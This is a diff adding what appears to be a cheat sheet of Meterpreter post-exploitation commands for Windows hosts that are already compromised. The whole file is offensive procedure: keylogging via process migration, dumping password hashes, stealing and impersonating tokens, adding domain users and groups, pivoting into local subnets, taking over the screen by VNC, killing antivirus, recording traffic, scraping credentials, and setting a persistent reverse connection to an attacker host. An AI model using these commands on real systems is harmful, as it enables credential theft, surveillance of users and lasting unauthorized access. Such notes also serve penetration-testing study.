@@ -1,0 +1,61 @@
+screenshot
+// Takes a screenshot of the exploited system.
+
+sysinfo
+// Show basic info about the exploited system.
+
+// We can keylog an exploited Windows machine by doing the following in meterpreter :
+ps - List all running processes.
+migrate [explorer PID] - migrate to the explorer process.
+run post/windows/capture/keylog_recorder - Use the keylog recorder module.
+
+// We can dump password hashes doing the following : 
+use priv - Load the priv extension.
+run post/windows/gather/hashdump - Use the hashdump module.
+
+// We can use the Token Impersonation technique as follows :
+ps - List all running processes.
+steal_token [PID] - Steal the token of the user running the process with PID.
+use incognito - Load incognito module.
+list_tokens -u - List all tokens.
+impersonate_token [token] - Impersonate another token. (Make sure to use \\).
+add_user [username] [password] -h [domain_ip] - Add a new user.
+add_group_user [group name within ""] [username] -h [domain_ip] - Add a user to group inside the domain.
+
+// We can possibly pivot into other systems on the same network as the exploited system as follows:
+run get_local_subnets - Lists local subnets.
+background - Put the sessions in background and access msfconsole.
+route add [subnet] [subnet mask] [session_id]
+route print - Print the routing table data.
+// Then, scan the network with any module/nmap and determine what to do with other hosts.
+// You can use the auto_add_route module before executing an exploit to automatically add
+all possible routes.
+
+run vnc
+// Installs a VNC sessions on the target to give us a GUI.
+
+run screen_unlock
+// Unlocks the target's screen for us to use the GUI.
+
+run post/windows/manage/migrate
+// Migrates our process to another process for the session to be maintaned.
+
+run killav
+// Kills the antivirus.
+
+run hashdump
+// Obtains the system password hashes.
+
+run packetrecorder -i [interface]
+// Records all traffic to/from the target machine.
+
+run scraper
+// Gather all necessary info about the system, like usernames, passwords, registery and system info.
+
+run persistence -X -i [num] -p [portnum] -r [host_ip]
+// Running this script will make the target connect automatically to us everytime it boots.
+// -X = Run on boot time.
+// -i = Time before connection retries.
+// -p = Host port number.
+// -r = Host IP address.
+// Create a listener in msfconsole using multi/handler and with the reverse_tcp payload.
